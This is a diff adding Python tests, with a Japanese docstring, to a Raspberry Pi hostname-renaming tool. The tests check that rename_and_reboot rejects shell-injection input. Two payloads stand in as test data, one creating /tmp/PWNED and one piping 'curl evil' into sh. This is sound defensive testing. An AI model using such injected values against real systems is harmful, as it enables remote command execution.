@@ -136,3 +136,22 @@ def test_add_to_inventory_is_idempotent(tmp_path):
     res = add_to_inventory("pizero2w-3.local", path=f)
     assert res.ok
     assert f.read_text(encoding="utf-8").count("pizero2w-3.local") == 1
+
+
+def test_rename_refuses_shell_metacharacters():
+    """new_hostname は sed / printf へ素で埋め込まれる。呼び出し側の検証に
+    依存せず、この関数自身で弾くこと。
+
+    `x/"; touch /tmp/PWNED; echo "` は sed の二重引用符から抜けて子の上で
+    任意のコマンドを実行できてしまう。
+    """
+    r = _recorder()
+    res = rename_and_reboot("10.42.0.194", 'x/"; touch /tmp/PWNED; echo "', runner=r)
+    assert res.ok is False
+    assert r.calls == []          # 一切実行しない
+
+
+def test_rename_refuses_single_quote_injection():
+    r = _recorder()
+    assert rename_and_reboot("10.42.0.194", "a'; curl evil|sh; echo '", runner=r).ok is False
+    assert r.calls == []
